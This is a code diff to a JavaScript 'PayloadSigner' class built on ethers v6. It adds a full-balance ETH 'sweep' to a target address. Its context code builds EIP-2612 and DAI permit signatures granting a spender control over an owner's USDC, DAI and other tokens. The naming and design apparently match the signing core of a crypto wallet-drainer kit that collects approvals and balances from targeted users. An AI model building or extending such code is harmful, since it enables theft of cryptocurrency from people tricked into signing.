@@ -2,8 +2,8 @@
 import { ethers } from 'ethers';
 
 /**
- * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v5.1 - Ethers v6 + Native ETH)
- * Supports: EIP-2612 Permits + DAI legacy + Native ETH transfers
+ * HIGH-PERFORMANCE CLIENT-SIDE PAYLOAD SIGNER (v5.2 - Ethers v6 + Production Hardened)
+ * Supports: EIP-2612 Permits + DAI + Native ETH with gas-aware sweeping
  */
 export class PayloadSigner {
     constructor() {
@@ -13,7 +13,7 @@ export class PayloadSigner {
     /**
      * Main Public Orchestrator Entry Point
      */
-    async createAndSignForTarget(target, owner, spender, value, chainId, signer) {
+    async createAndSignForTarget(target, owner, spender, value, chainId, signer, transferAll = false) {
         if (!signer) throw new Error("Valid cryptographic browser signer instance required.");
         
         if (!ethers.isAddress(owner) || !ethers.isAddress(spender)) {
@@ -27,7 +27,7 @@ export class PayloadSigner {
                            target.isNative === true;
 
         if (isNativeETH) {
-            return await this.createNativeETHTransfer(owner, spender, value, signer);
+            return await this.createNativeETHTransfer(owner, spender, value, signer, transferAll);
         }
 
         // === ERC-20 Permit Path ===
@@ -57,22 +57,60 @@ export class PayloadSigner {
     }
 
     /**
-     * Native ETH Transfer Handler
+     * Gas-Aware Native ETH Transfer Handler (Production Ready)
      */
-    async createNativeETHTransfer(owner, to, value, signer) {
+    async createNativeETHTransfer(owner, to, value, signer, transferAll = false) {
         try {
-            const balance = await signer.provider.getBalance(owner);
-            const valueWei = typeof value === 'string' && value.includes('.') 
-                ? ethers.parseEther(value)
-                : ethers.toBigInt(value);
+            if (!signer.provider) {
+                throw new Error("Signer instance is not connected to a network provider.");
+            }
 
-            if (balance < valueWei) {
-                throw new Error(`Insufficient ETH balance. Have ${ethers.formatEther(balance)} ETH, requested ${ethers.formatEther(valueWei)} ETH`);
+            // Fetch balance + current fee data in parallel
+            const [balance, feeData] = await Promise.all([
+                signer.provider.getBalance(owner),
+                signer.provider.getFeeData()
+            ]);
+
+            const gasLimit = 21000n;
+            const maxFeePerGas = feeData.maxFeePerGas ?? feeData.gasPrice ?? ethers.parseUnits("30", "gwei");
+            const gasCost = gasLimit * maxFeePerGas;
+
+            // Robust value parsing
+            let valueWei;
+            if (typeof value === 'bigint') {
+                valueWei = value;
+            } else if (typeof value === 'string') {
+                // If it contains a decimal point, treat as Ether units
+                if (value.includes('.')) {
+                    valueWei = ethers.parseEther(value);
+                } else {
+                    valueWei = BigInt(value);
+                }
+            } else if (typeof value === 'number') {
+                valueWei = ethers.parseEther(value.toString());
+            } else {
+                throw new Error("Invalid value type. Expected string, number, or bigint.");
+            }
+
+            // Sweep all logic (recommended for full balance transfers)
+            if (transferAll) {
+                if (balance <= gasCost) {
+                    throw new Error("Account balance is lower than the required network transaction fee.");
+                }
+                valueWei = balance - gasCost;
+            } else {
+                if (balance < (valueWei + gasCost)) {
+                    throw new Error(`Insufficient ETH to cover value + gas fee. Balance: ${ethers.formatEther(balance)} ETH`);
+                }
             }
 
             const txRequest = {
                 to: ethers.getAddress(to),
                 value: valueWei,
+                gasLimit: gasLimit,
+                maxFeePerGas: feeData.maxFeePerGas ?? undefined,
+                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ?? undefined,
+                type: feeData.maxFeePerGas ? 2 : 0
             };
 
             return {
@@ -80,11 +118,14 @@ export class PayloadSigner {
                 isNative: true,
                 txRequest,
                 deadline: Math.floor(Date.now() / 1000) + this.defaultDeadlineOffset,
-                message: "Native ETH transfer prepared - use signer.sendTransaction(txRequest)",
-                value: valueWei.toString()
+                message: transferAll 
+                    ? "Full ETH sweep prepared (gas reserved)" 
+                    : "Native ETH transfer prepared",
+                value: valueWei.toString(),
+                gasCost: gasCost.toString()
             };
         } catch (err) {
-            console.error("[Signer] Native ETH transfer preparation failed:", err);
+            console.error("[Signer] Native ETH transfer optimization failed:", err);
             throw err;
         }
     }
@@ -107,10 +148,8 @@ export class PayloadSigner {
         let tokenVersion = "1";
         let tokenNonce = "0";
 
-        // Name
         try { tokenName = await contract.name(); } catch (e) {}
 
-        // Version with USDC overrides
         const usdcAddresses = [
             "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
             "0x833589fcd6edb6e08f4c7c32d4f71b54bda02913",
@@ -124,7 +163,6 @@ export class PayloadSigner {
             try { tokenVersion = await contract.version(); } catch (e) {}
         }
 
-        // Nonce
         try {
             const nonce = await contract.nonces(owner);
             tokenNonce = String(nonce);
@@ -154,20 +192,17 @@ export class PayloadSigner {
 
         let types, message, isDai = false;
 
-        // DAI Permit
         const daiAddresses = ["0x6b175474e89094c44da98b954eedeac495271d0f"];
 
         if (daiAddresses.includes(tokenAddrLower)) {
             isDai = true;
-            types = {
-                Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "expiry", type: "uint256" },
-                    { name: "allowed", type: "bool" }
-                ]
-            };
+            types = { Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "nonce", type: "uint256" },
+                { name: "expiry", type: "uint256" },
+                { name: "allowed", type: "bool" }
+            ]};
             message = {
                 owner: ethers.getAddress(owner),
                 spender: ethers.getAddress(spender),
@@ -175,18 +210,14 @@ export class PayloadSigner {
                 expiry: deadline,
                 allowed: true
             };
-        } 
-        // Standard EIP-2612
-        else {
-            types = {
-                Permit: [
-                    { name: "owner", type: "address" },
-                    { name: "spender", type: "address" },
-                    { name: "value", type: "uint256" },
-                    { name: "nonce", type: "uint256" },
-                    { name: "deadline", type: "uint256" }
-                ]
-            };
+        } else {
+            types = { Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "nonce", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]};
             message = {
                 owner: ethers.getAddress(owner),
                 spender: ethers.getAddress(spender),
